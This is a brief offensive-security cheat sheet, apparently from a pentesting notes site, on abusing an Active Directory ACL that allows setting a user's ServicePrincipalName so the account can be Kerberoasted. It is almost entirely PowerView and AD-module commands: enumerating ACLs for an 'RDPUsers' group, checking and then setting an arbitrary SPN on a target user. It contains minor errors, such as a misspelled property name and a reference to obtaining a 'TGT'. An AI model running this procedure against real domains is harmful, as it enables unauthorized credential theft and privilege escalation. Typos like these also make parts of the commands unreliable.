# Abusing Set SPN ACL To Kerberoasting

#### Enumerating the permission for a Group On ACLs (Using PowerView\_Dev): <a href="#enumerating-the-permission-for-a-group-on-acls-using-powerview_dev" id="enumerating-the-permission-for-a-group-on-acls-using-powerview_dev"></a>

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferewernceName -match "RDPUsers"} 
```

#### To Check that a user has a not a SPN <a href="#to-check-that-a-user-has-a-not-a-spn" id="to-check-that-a-user-has-a-not-a-spn"></a>

```powershell
Get-DomainUser -Identity aduser | select serviceprincipalname
```

**Using Active Directory module:**

```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

#### Set a SPN for the user (must be unique for the domain): <a href="#set-a-spn-for-the-user-must-be-unique-for-the-domain" id="set-a-spn-for-the-user-must-be-unique-for-the-domain"></a>

```powershell
Set-DomainObject -Identity aduser -Set @{serviceprincipalname='ops/whatever1'}
```

**Using Active Directory module:**

```powershell
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}
```

Now Follow the same process to Get a TGT
